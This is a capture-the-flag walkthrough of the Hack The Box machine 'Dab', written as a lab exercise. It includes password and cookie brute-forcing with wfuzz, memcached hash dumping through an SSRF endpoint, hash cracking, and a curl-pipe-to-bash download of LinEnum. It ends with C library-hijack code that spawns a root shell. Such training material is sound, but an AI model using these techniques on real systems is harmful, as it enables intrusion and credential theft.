---
published: false
---
# DAB - HTB
Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------

Source: Walkthrough Youtube: https://www.youtube.com/watch?v=JvqBaZ0WnV4
[](https://www.youtube.com/watch?v=JvqBaZ0WnV4)
Target: 10.10.10.86

**ENUMERATION**

nmap

    nmap -sC -sV -oA nmap/dab 10.10.10.86
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150444462_image.png)


Port 21 - FTP
vsftpd identified - attempt searchsploit for possible vulnerabilities.

    searchsploit vsftpd
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150506239_image.png)


*to which version 3.0.3 was not listed.*

Inspect FTP

    ftp 10.10.10.86
    name: anonymous
    pass: anonymous
    get dab.jpg
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150778815_image.png)


Inspect image metadata:

    exiftool dab.jpg
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150828688_image.png)

    strings dab.jpg | less
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150874942_image.png)

    binwalk dab.jpg
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150925627_image.png)


(hex editor)

    xxd dab.jpg | less
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150974754_image.png)


*No “.zip” or anything out of place identified within the image.*

open dab.jpg

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151057435_image.png)



Port 22 - SSH
Identifed as “Ubuntu 4ubuntu2.4” possibly Zenial

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549150641359_image.png)


Port 80 & 8080
Identified as “nginx.1.10” web-servers.

Navigate to port 80 webpage

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151110985_image.png)


Login prompt identified - attempt SQL injection

    Login: admin
    Pass: ' or '1'='1
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151294865_image.png)


*login failed.*

continue enumeration of login fields with wfuzz

    wfuzz -h
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151362803_image.png)

    wfuzz -c --hw 36 -w /usr/share/seclists/Passwords/darkweb2017-top1000 -d 'username=admin&password=FUZZ&submit=login' http:10.10.10.86/login
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151708471_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151738896_image.png)


you can hide returns with more than 36 words with 

    --hw 36

inspect for post data required for “-d” - navigate back to webpage enter credentials and capture with Burp.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151560515_image.png)


re-wfuzz

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151874497_image.png)


note: passing unicode results in a 500 response with is an internal error

*Valid Password identified: Password1*

**WEB-LOGIN**

Login with credentials

    Username: admin
    Pass: Password1 
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152047275_image.png)


inspect source (ctrl+u)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152089651_image.png)


*identified data tables were loaded from file : MySQL DB*

refresh page and inspect source

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152184576_image.png)


*identified data tables were loaded from Cache - no obvious ways to exploit this.*



Navigate to port 8080 webpage

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549151155242_image.png)


Access denied: password authentication cookie not set

to find cookie to be used we could use wfuzz again but opting for guessing and use of Burp.

*before header manipulation:*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152310194_image.png)


inserting:

    Cookie: password=ippsec
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152393691_image.png)


Response: *password authentication cookie is incorrect*

wfuzz header

    wfuzz -c --hw 29 -w /usr/share/seclists/Passwords/darkweb2017-top1000 -H 'Cookie: password=FUZZ' http:10.10.10.86:8080/
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152592273_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152664736_image.png)


re-wfuzz removing 29w

    wfuzz -c --hw 29 -w /usr/share/seclists/Passwords/darkweb2017-top1000 -H 'Cookie: password=FUZZ' http:10.10.10.86:8080/
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152723571_image.png)


*RESPONSE: “secret”*

modify the Burp header

    Cookie: password=secret
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152789791_image.png)


*PAGE RESPONDS  - “Status of cache engine: online”*

navigate back to firefox and open dev tools > storage - ensure correct page is highlighed and press the “+” to add a cookie. Set name to Password and Value to secret

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549152983546_image.png)



refresh page with newly installed cookie

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153040964_image.png)


attempt to view ports:
TCP Port: 22 Line to send: Pleasesubscribe

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153131664_image.png)


invalid port
TCP Port: 31337 Line to send: asdf

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153174364_image.png)


TCP Port: 80 Line to send: asdf

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153247933_image.png)


bad request returned


vaild header:
TCP Port: 80 Line to send: Get / HTTP/1.1

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153328017_image.png)


Response: “*Suspected hacking attempt detected”*


Test access to site without cookie

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153502253_image.png)


*identified that with the /socket?port=80&cmd=asdf we no longer need the cookie.*

we need to find the bad character list to which wfuzz can be used.

    wfuzz -w -c /usr/share/seclists/Fuzzing/alphanum-case-extra.txt 'http://10.10.10.86:8080/socket?port=80&cmd=FUZZ'
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153673394_image.png)


hide everything that is not 84 words.

re-wfuzz

    wfuzz -w --hw 84 -c /usr/share/seclists/Fuzzing/alphanum-case-extra.txt 'http://10.10.10.86:8080/socket?port=80&cmd=FUZZ'
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153734780_image.png)


returns a list of symbols that get detected as “suspected hacking attempt”

move to brute forcing all the ports with wfuzz

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549153814378_image.png)


what the server can access from it’s side - server side attack.


    wfuzz -c --hc -z range,1-65535 'http://10.10.10.86:8080/socket?port=FUZZ&cmd=PleaseSubscribe'
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154051736_image.png)


*Port 11211 identified.*


![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154107378_image.png)


returns:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154132971_image.png)



google “what is port 11211”

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154202180_image.png)


returns what is to be “memcached”


search memcached cheat sheets

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154270438_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154297627_image.png)


send port 11211 Line to send: stats

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154348253_image.png)


*Returns memcached server stats.*


to which now leads down the road of discovering how memcache works. 

“Which in essence when login in a query is made to the MySQL server which is a bit intensive for the server but utilizing memcache we are able to quickly make these same queries without the same over head on the server.”


move to Burp to continue further memcache exploration. 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549154598559_image.png)


change the GET request to include slabs

    GET /socket?port=11211&cmd=stats+slabs HTTP/1.1

slabs are what information is stored inside memcache or array or items

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219169454_image.png)


*identifying that we have both 16 and 26 slabs for memory*

explore slab 16

    GET /socket?port=11211&cmd=stats+cachedump+16+0 HTTP/1.1

*the "+0” returns the maximum number of results which can be changed.*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219366715_image.png)


exploring the stock

    GET /socket?port=11211&cmd=get+stock HTTP/1.1
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219486031_image.png)


*returns “END” or no output.*

however if this information was returned from memcache it would return values. To continue we would need to refresh page to switch from MySQL to the memcache and quicky run the “get+stock” command.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219587063_image.png)


*returns the actual stock values within memcache.*

Continue to explore slab 26

    GET /socket?port=11211&cmd=stats+cachedump+26+0 HTTP/1.1
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219683053_image.png)


*returned item is called “users”*

Try to query the users with:

    GET /socket?port=11211&cmd=get+users HTTP/1.1
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219819469_image.png)


*returns “END” or no output - quickly refresh page and run command again.*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219905281_image.png)


*returns no users again because we did not query the user table to which we would need to logout and login for that table to accessed then parsed into the memcache.*

**ENUMERATE USERS/HASHES**

logout

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549219972750_image.png)


login

    user: admin
    pass: Password1
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220017460_image.png)


quickly return back to Burp and run the “get+users”

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220059761_image.png)


*which returns the complete user list.*

Copy list and move to Decoder tab

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220154261_image.png)


from Decoder tab > smart decode > click on the “&..” html to  select it.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220244387_image.png)


from new terminal - create users.json > paste list in > save file

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220292359_image.png)


To sort the users.json we use a program called jq

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220341562_image.png)

    jq . users.json
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220380357_image.png)


to preform field separator of just usernames pipe the command with awk

    jq . users.json | awk -F\" '{print $2} > users.lst
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220767350_image.png)


*returns full list of just usernames and pipes it to a file name “users.lst”.*

AWK Quick Field Guide:
first field:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220566996_image.png)


second field:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220595043_image.png)


third field:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220619422_image.png)


fourth field: 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220667547_image.png)


fifth field:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220692595_image.png)


With list of all user we want to move to the password hashes

    jq . users.json | awk -F\" '{print $4}' > passwords
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549220931247_image.png)


*returns a list of just password hashes and creates a file named “passwords”. With the password hashes we can move to hashcat and attempt to crack.*

check what type of hashes:

    echo -n HASHVALUE | wc -c
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221104835_image.png)


*returns a word count of 32 which is closely aligned with MD5 hashes.*

with a large list of names we would need to enumerate the user list and there is a CVE - “OpenSSH 7.7 - Username Enumeration” - exploit.db.com/exploits/45233

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221268518_image.png)



easiest solution to enumeration is the use of metasploit - Start Metasploit:

    msfdb run

search for ssh_enum

    search ssh enum


![User-uploaded image: image.png](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221412247_image.png)


use the auxiliary

    user axiliary/scanner/ssh/shh enumusers 
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221520566_image.png)



    set RHOST
    set THREADS 50
    set USER FILE user.lst
    run


![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221592377_image.png)


test the functionality of this ssh enum easily by creating a new file with known usernames ie. root and run scanner.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221728534_image.png)


*to which we have just verified the aux scanner does work correctly. - Continue to user.lst*


Username found: genevieve

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221838390_image.png)


search for hash

    jq . users.json| grep genevieve
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549221895410_image.png)


*copy hash > move to hashcat to crack - DO NOT USE VM to crack hashes process is very slow.*

*CRACKING WITH HASHCAT:*
move to hashcat directory

    cd hashcat

create new file for hash > paste hash

    vi hashes/dab.gene
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222057011_image.png)


find the value required for cracking MD5:

    hashcat -h|grep -i md5
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222212298_image.png)


run hashcat against the hash:

    ./hashcat -m 0 hashes/dab.gene /opt/wordlist/rockyou.txt
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222360115_image.png)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222387606_image.png)


*returned a cracked password of Princess1*


SSH to box

    ssh genevieve@10.10.10.86
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222484902_image.png)


*Successful Local User Account.*

**LOCAL SYS ENUMERATION**
capture user flag

    cat user.txt
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222571614_image.png)


test sudo commands

    sudo -l
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222625100_image.png)


*execution of try_harder allowed*

open try_harder

    sudo try_harder
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222683536_image.png)


*a switch to “root@dab” but with any input leads directly to a segmentation fault. Prompted to try something else.* 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222822051_image.png)


*trying something else leads to another sementation fault.*

Move to inspect try_harder application > copy locally with secure copy

    scp genevieve@10.10.10.86:/usr/bin/try_harder
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549222965015_image.png)


analyse file with raider (r2)

    r2 try_harder
    aaa #analyse all functions
    afl #anaylse function list / prints lists
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549223067360_image.png)

    pdf @ main #print dissasembly function
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549223176775_image.png)


Analysis Breakdown:
moves str_root_dab into edi and printf
fget asking for input
calling sleep for three then calling “that would have been too easy”

overall: rabbit hole

secondary view: C# friendly view

    pdc @ main
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549223316528_image.png)



move to continue local system enum with Linenum

    python -m SimpleHTTPServer 8000


move Linenum to box and run

    curl LOCALIP:8000/LinEnum.sh | bash
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549223495165_image.png)


LINENUM MOD:
change LinEnum script to

    +thorough=1
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549223564776_image.png)


*Runs though enumeration.*

LinEnum results:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549223711788_image.png)


Analysis:

- Kernel 2018 - no privesc
- root login - back in august
- passwd contents - lxd group interesting
- root can login through ssh
- crons normal - nothing modified recently
- nothing interesting in teh ARP history - non docker image
- SUID files - emphaisis on anything thats 2018 - found myexec / ldconfig (not a normal binary)

poke at myexec

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224041163_image.png)


download file locally with secure copy (scp)
r2 on myexec

    aaa
    afl
    pdf @ main
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224172918_image.png)


Analysis:

- moving a string just before entering a password. 
- Password looking like “s3cur3l0g1n”
- calling of sys.imp.sec login which doesnt exist on afl list more likely a shared binary

run “myexec” again with password

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224400928_image.png)


*password works, and returns “seclogin() called” and function not implemented yet.*

check what functions are being called by a binary file:

    lld /usr/bin/myexec
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224532337_image.png)


 *libseclogin.so is the function being called and will require further investigation.*
 
 download libseclogin.so locally via secure copy (scp)

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224656241_image.png)


inspect the binary with r2

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224703935_image.png)


*file looks very familiar to try_harder which calls a function and prints to screen and exits. Unlike try harder we have a shared library.*

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224806078_image.png)


after inspecting the SUID files we see the sbin/ldconfig handles all the dynamic linking

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224873166_image.png)


**PRIVESC**

we can move to:

    cd /etc/ld/so.conf.d
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224931325_image.png)


*we can see there is a test.conf*

    cat test.conf
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549224966279_image.png)


*we can see we can drop files into /tmp and re-run ldconfig and repopulates to a new library.*

with the end goal of changing libseclogin.so > [link we want to change]

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225047943_image.png)


with control of ldconfig we should be able to modify.

*CREATE BASIC SHELL:*
create libseclogin.c

    #include <stdlib.h>
    extern int seclogin();
    
    int seclogin(){
            setreuid(0,0);
            execve("/bin/bash", NULL, NULL);
            }
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225343478_image.png)


compile program with gcc

    gcc -shared -fPIC -o libseclogin.so libseclogin.c
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225487032_image.png)


*libseclogin.so created and will now need to be moved to tmp folder*


    cp libseclogin.so /tmp
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225564248_image.png)


**ROOT**

check the ldd of myexec

    ldd /usr/bin/myexec
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225628907_image.png)


execute the ldconfig

    ldconfig
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225684083_image.png)


check ldd of myexec again:

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225716379_image.png)


*now we have successfully overwrite the pointer for libseclogin.so*

now we execute the “myexec” and enter password we have achieved root.

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225876198_image.png)


if we didnt know the password to myexec we could have always taken over another binary “printf”

    #include <stdlib.h>
    extern int printf();
    
    int printf(){
            setreuid(0,0);
            execve("/bin/bash", NULL, NULL);
            }
![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549225992230_image.png)


recompile 

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549226137687_image.png)


inspect file

